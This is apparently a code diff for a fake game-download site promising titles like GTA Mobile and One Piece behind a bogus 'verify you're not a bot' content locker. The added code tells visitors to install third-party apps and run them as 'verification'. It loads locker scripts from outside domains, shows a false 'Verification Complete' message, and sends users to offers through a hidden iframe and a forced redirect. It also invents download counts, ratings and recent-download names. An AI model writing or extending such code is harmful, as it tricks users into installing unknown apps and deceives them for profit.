@@ -692,6 +692,86 @@
             font-size: 16px;
         }
 
+        /* How to Verify Section */
+        .how-to-verify {
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(30, 144, 255, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(30, 144, 255, 0.3);
+            display: none;
+        }
+
+        .how-to-verify.active {
+            display: block;
+        }
+
+        .how-to-verify h3 {
+            color: #1e90ff;
+            margin-bottom: 15px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .verify-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .verify-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 10px;
+            background: rgba(30, 144, 255, 0.1);
+            border-radius: 8px;
+        }
+
+        .step-number {
+            background: #1e90ff;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            flex: 1;
+            color: #ffffff;
+            font-size: 14px;
+        }
+
+        .verify-image {
+            width: 100%;
+            max-width: 300px;
+            margin: 15px auto;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .verify-image img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .verify-tip {
+            text-align: center;
+            color: #1e90ff;
+            font-size: 12px;
+            margin-top: 10px;
+            font-style: italic;
+        }
+
         /* FAQ Section */
         .faq-section {
             margin: 60px 0 30px 0;
@@ -1089,6 +1169,49 @@
                         <h3>Verify you're not a bot</h3>
                         <p>Complete verification to continue download</p>
                         <button class="verify-btn" onclick="showContentLocker(currentGameId, currentPlatform)">Verify Now</button>
+                        <button class="verify-btn" onclick="showHowToVerify()" style="background: transparent; border: 1px solid #1e90ff; margin-left: 10px;">
+                            <i class="fas fa-question-circle"></i> How to Verify
+                        </button>
+                    </div>
+                    
+                    <!-- How to Verify Section -->
+                    <div class="how-to-verify" id="howToVerify">
+                        <h3>How to Complete Verification</h3>
+                        <div class="verify-steps">
+                            <div class="verify-step">
+                                <div class="step-number">1</div>
+                                <div class="step-text">Choose any offer from the verification list that appears</div>
+                            </div>
+                            <div class="verify-step">
+                                <div class="step-number">2</div>
+                                <div class="step-text">Download and install the selected app</div>
+                            </div>
+                            <div class="verify-step">
+                                <div class="step-number">3</div>
+                                <div class="step-text">Complete the required action (run for 30 seconds, make searches, etc.)</div>
+                            </div>
+                            <div class="verify-step">
+                                <div class="step-number">4</div>
+                                <div class="step-text">Return to this page and your game will unlock automatically</div>
+                            </div>
+                        </div>
+                        
+                        <div class="verify-image">
+                            <!-- This would be your verification screenshot -->
+                            <div style="background: #2a2d4a; padding: 20px; text-align: center; color: #1e90ff;">
+                                <i class="fas fa-mobile-alt" style="font-size: 40px; margin-bottom: 10px;"></i>
+                                <p>Verification Offers Example</p>
+                                <p style="font-size: 12px; color: #aaa; margin-top: 10px;">Choose any app offer to complete verification</p>
+                            </div>
+                        </div>
+                        
+                        <div class="verify-tip">
+                            💡 Tip: Choose the simplest offer for fastest verification!
+                        </div>
+                        
+                        <button class="verify-btn" onclick="hideHowToVerify()" style="width: 100%; margin-top: 15px;">
+                            <i class="fas fa-arrow-left"></i> Back to Verification
+                        </button>
                     </div>
                     
                     <div class="content-locker" id="popupLocker">
@@ -1172,17 +1295,19 @@
             },
             script: 'https://lockverify.org/cl/js/grq5qp'
         },
-        'onepiece': {
-            title: 'One Piece',
-            image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMHw_2cgPjz9I9BNlTa_uQBs0-AK_pHjiq3Q&s',
-            description: 'Join the Straw Hat crew in this exciting pirate adventure game. Battle other pirates and collect treasure in this action-packed mobile game.',
-            meta: ['Mobile', 'MOD', 'Adventure'],
+        'gtamobile': {
+            title: 'GTA Mobile',
+            image: 'https://img.utdstc.com/icon/d45/de4/d45de47f27a8471894c3465c1cd8516cc8aea333bf7a27b1291cb9ecca45172f:200',
+            description: 'Experience the thrill of Grand Theft Auto on your mobile device. Explore vast cities, complete missions, and enjoy the open-world gameplay that made GTA famous.',
+            meta: ['Mobile', 'Action', 'Open World'],
             stats: {
-                downloads: '2.1M+',
-                rating: '4.6',
-                size: '1.5GB'
+                downloads: '4.2M+',
+                rating: '4.8',
+                size: '2.5GB'
             },
-            script: 'https://lockverify.org/cl/js/1x581p'
+            androidScript: 'https://lockedapp.org/cl/js/j76owp',
+            iosScript: 'https://lockedapp.org/cl/js/xp63kg',
+            hasMultiPlatforms: true
         },
         'solo': {
             title: 'Solo Leveling Arise',
@@ -1210,19 +1335,17 @@
             iosScript: 'https://appverification.live/cl/js/w6ooxv',
             hasMultiPlatforms: true
         },
-        'hyperdrift': {
-            title: 'Hyper Drift',
-            image: 'https://modcombo.com/uploads/2021/8/hyper-drift-thumbnail.jpg',
-            description: 'Experience the ultimate drifting game with hyper-realistic physics and stunning graphics. Customize your cars and compete in drift competitions.',
-            meta: ['Mobile', 'Racing', 'Drift'],
+        'infernusparadise': {
+            title: 'The Infernus Paradise',
+            image: 'https://play-lh.googleusercontent.com/IoK2XgbdDl3t1Yvv-oTVnQpD6Zv9p9EdScZSnIUJecEZ7fkdeO917O5eqpeayGUNrA=w240-h480-rw',
+            description: 'Immerse yourself in a fiery paradise where adventure meets action. Explore stunning environments, battle epic bosses, and unlock powerful abilities in this Android-exclusive gaming experience.',
+            meta: ['Android', 'Action', 'Adventure'],
             stats: {
-                downloads: '950K+',
-                rating: '4.5',
-                size: '850MB'
+                downloads: '1.3M+',
+                rating: '4.7',
+                size: '1.4GB'
             },
-            androidScript: 'https://lockverify.org/cl/js/ve9x7x',
-            iosScript: 'https://lockverify.org/cl/js/27xrep',
-            hasMultiPlatforms: true
+            script: 'https://redirectapps.online/cl/js/1xomqx'
         },
         'iamacat': {
             title: 'I Am A Cat',
@@ -1261,6 +1384,18 @@
                 size: '1.2GB'
             },
             script: 'https://lockverify.org/cl/js/6n74wm'
+        },
+        'onepiece': {
+            title: 'One Piece',
+            image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMHw_2cgPjz9I9BNlTa_uQBs0-AK_pHjiq3Q&s',
+            description: 'Join the Straw Hat crew in this exciting pirate adventure game. Battle other pirates and collect treasure in this action-packed mobile game.',
+            meta: ['Mobile', 'MOD', 'Adventure'],
+            stats: {
+                downloads: '2.1M+',
+                rating: '4.6',
+                size: '1.5GB'
+            },
+            script: 'https://lockverify.org/cl/js/1x581p'
         }
     };
 
@@ -1287,9 +1422,9 @@
             image: 'https://play-lh.googleusercontent.com/DTBOpmXf2zJHVxOCjSPMPIJHRdTupGdm30JXca40HugEwurjN_AFIxFxpn5UKzaB9OP3tohDTojBwYEO5vdkOUE=w240-h480-rw'
         },
         {
-            id: 'projectjazz',
-            name: 'Project Jazz',
-            image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXPJhCFOJULzIUzs73fM2A8yGioOy2xOSSZQ&s'
+            id: 'gtamobile',
+            name: 'GTA Mobile',
+            image: 'https://img.utdstc.com/icon/d45/de4/d45de47f27a8471894c3465c1cd8516cc8aea333bf7a27b1291cb9ecca45172f:200'
         }
     ];
 
@@ -1298,17 +1433,30 @@
         { name: 'Emma', game: 'Demon Slayer PPSSPP', initial: 'E' },
         { name: 'James', game: 'Naruto Ultimate Ninja Storm', initial: 'J' },
         { name: 'Sophia', game: 'Anime Battle Royal', initial: 'S' },
-        { name: 'Liam', game: 'One Piece', initial: 'L' },
+        { name: 'Liam', game: 'GTA Mobile', initial: 'L' },
         { name: 'Olivia', game: 'Solo Leveling Arise', initial: 'O' },
-        { name: 'Noah', game: 'Hyper Drift', initial: 'N' },
+        { name: 'Noah', game: 'The Infernus Paradise', initial: 'N' },
         { name: 'Ava', game: 'I Am A Cat', initial: 'A' },
         { name: 'David', game: 'Project Jazz', initial: 'D' },
-        { name: 'Mia', game: 'Spider Fuser', initial: 'M' }
+        { name: 'Mia', game: 'Spider Fuser', initial: 'M' },
+        { name: 'Ethan', game: 'One Piece', initial: 'E' }
     ];
 
     let currentGameId = '';
     let currentPlatform = 'mobile';
     let notificationInterval;
+
+    // How to Verify functions
+    function showHowToVerify() {
+        document.getElementById('popupVerify').style.display = 'none';
+        document.getElementById('howToVerify').classList.add('active');
+        trackEvent('Verification', 'How To View', currentGameId);
+    }
+
+    function hideHowToVerify() {
+        document.getElementById('howToVerify').classList.remove('active');
+        document.getElementById('popupVerify').style.display = 'block';
+    }
 
     // Initialize featured mods
     function initFeaturedMods() {
@@ -1336,9 +1484,9 @@
         gameGrid.innerHTML = '';
         
         const gameOrder = [
-            'animebattle', 'demon', 'naruto', 'onepiece', 
-            'solo', 'spiderfuser', 'hyperdrift', 'iamacat', 
-            'hiddenones', 'projectjazz'
+            'animebattle', 'demon', 'naruto', 'gtamobile', 
+            'solo', 'spiderfuser', 'infernusparadise', 'iamacat', 
+            'hiddenones', 'projectjazz', 'onepiece'
         ];
         
         gameOrder.forEach(gameId => {
@@ -1351,11 +1499,17 @@
             };
             
             let platformIcons = '';
-            if (game.hasMultiPlatforms || gameId === 'spiderfuser') {
+            if (game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile') {
                 platformIcons = `
                     <div class="platform-icons">
                         <i class="fab fa-android platform-icon"></i>
                         <i class="fab fa-apple platform-icon"></i>
+                    </div>
+                `;
+            } else if (gameId === 'infernusparadise') {
+                platformIcons = `
+                    <div class="platform-icons">
+                        <i class="fab fa-android platform-icon"></i>
                     </div>
                 `;
             }
@@ -1417,7 +1571,7 @@
             metaContainer.innerHTML = '';
             game.meta.forEach(tag => {
                 const span = document.createElement('span');
-                span.className = tag.includes('PC') || tag.includes('Mobile') ? 'popup-platform' : 'popup-tag';
+                span.className = tag.includes('PC') || tag.includes('Mobile') || tag.includes('Android') ? 'popup-platform' : 'popup-tag';
                 span.textContent = tag;
                 metaContainer.appendChild(span);
             });
@@ -1450,7 +1604,7 @@
                 platformButtons.style.display = 'flex';
                 platformButtonsMulti.style.display = 'none';
                 regularDownload.style.display = 'none';
-            } else if (game.hasMultiPlatforms || gameId === 'spiderfuser') {
+            } else if (game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile') {
                 platformButtons.style.display = 'none';
                 platformButtonsMulti.style.display = 'flex';
                 regularDownload.style.display = 'none';
@@ -1464,6 +1618,7 @@
             document.getElementById('popupProgress').style.display = 'none';
             document.getElementById('popupVerify').style.display = 'none';
             document.getElementById('popupLocker').style.display = 'none';
+            document.getElementById('howToVerify').classList.remove('active');
             document.getElementById('popupLocker').innerHTML = '<div class="locker-placeholder">Complete verification to download...</div>';
             
             // Show popup
@@ -1539,6 +1694,7 @@
         
         // Hide verify section
         document.getElementById('popupVerify').style.display = 'none';
+        document.getElementById('howToVerify').classList.remove('active');
         
         // Show content locker
         const contentLocker = document.getElementById('popupLocker');
@@ -1558,7 +1714,7 @@
         
         if (gameId === 'demon' && game.hasPlatforms) {
             scriptUrl = platform === 'mobile' ? game.mobileScript : game.pcScript;
-        } else if ((game.hasMultiPlatforms || gameId === 'spiderfuser') && (platform === 'android' || platform === 'ios')) {
+        } else if ((game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile') && (platform === 'android' || platform === 'ios')) {
             scriptUrl = platform === 'android' ? game.androidScript : game.iosScript;
         }
         
@@ -1572,6 +1728,20 @@
         
         script.onload = function() {
             trackEvent('Verification', 'Script Loaded', `${game.title} - ${platform}`);
+            
+            // Check if the content locker script has initialized properly
+            setTimeout(() => {
+                if (contentLocker.innerHTML.includes('locker-placeholder')) {
+                    // If content locker didn't load properly, try alternative approach
+                    contentLocker.innerHTML = `
+                        <div style="text-align: center; padding: 20px;">
+                            <h3 style="color: #1e90ff; margin-bottom: 15px;">Complete Verification</h3>
+                            <p style="margin-bottom: 15px;">Please complete the verification to download ${game.title}</p>
+                            <button class="verify-btn" onclick="completeVerification('${gameId}', '${platform}')">Complete Verification</button>
+                        </div>
+                    `;
+                }
+            }, 3000);
         };
         
         // Add the script to the locker
@@ -1579,6 +1749,61 @@
         
         // Show download notification
         setTimeout(showDownloadNotification, 15000);
+    }
+
+    // Alternative verification completion function
+    function completeVerification(gameId, platform) {
+        trackEvent('Verification', 'Complete', `${gameData[gameId].title} - ${platform}`);
+        
+        const contentLocker = document.getElementById('popupLocker');
+        contentLocker.innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <h3 style="color: #1e90ff; margin-bottom: 15px;">Verification Complete!</h3>
+                <p style="margin-bottom: 15px;">Thank you for verifying. Your download will start shortly.</p>
+                <div class="loading" style="margin: 0 auto;"></div>
+            </div>
+        `;
+        
+        // Redirect to offer after verification
+        setTimeout(() => {
+            redirectToOffer(gameId, platform);
+        }, 2000);
+    }
+
+    // Function to redirect to the offer after verification
+    function redirectToOffer(gameId, platform) {
+        trackEvent('Redirect', 'Offer', `${gameData[gameId].title} - ${platform}`);
+        
+        // Get the appropriate script URL
+        const game = gameData[gameId];
+        let scriptUrl = game.script;
+        
+        if (gameId === 'demon' && game.hasPlatforms) {
+            scriptUrl = platform === 'mobile' ? game.mobileScript : game.pcScript;
+        } else if ((game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile') && (platform === 'android' || platform === 'ios')) {
+            scriptUrl = platform === 'android' ? game.androidScript : game.iosScript;
+        }
+        
+        // Create a hidden iframe to load the offer
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = scriptUrl.replace('/js/', '/').replace('.js', '');
+        document.body.appendChild(iframe);
+        
+        // Also try to redirect the main window as a fallback
+        setTimeout(() => {
+            window.location.href = scriptUrl.replace('/js/', '/').replace('.js', '');
+        }, 1000);
+        
+        // Show success message
+        const contentLocker = document.getElementById('popupLocker');
+        contentLocker.innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <h3 style="color: #1e90ff; margin-bottom: 15px;">Redirecting to Download...</h3>
+                <p style="margin-bottom: 15px;">Please wait while we redirect you to the download page.</p>
+                <div class="loading" style="margin: 0 auto;"></div>
+            </div>
+        `;
     }
 
     function goHome() {
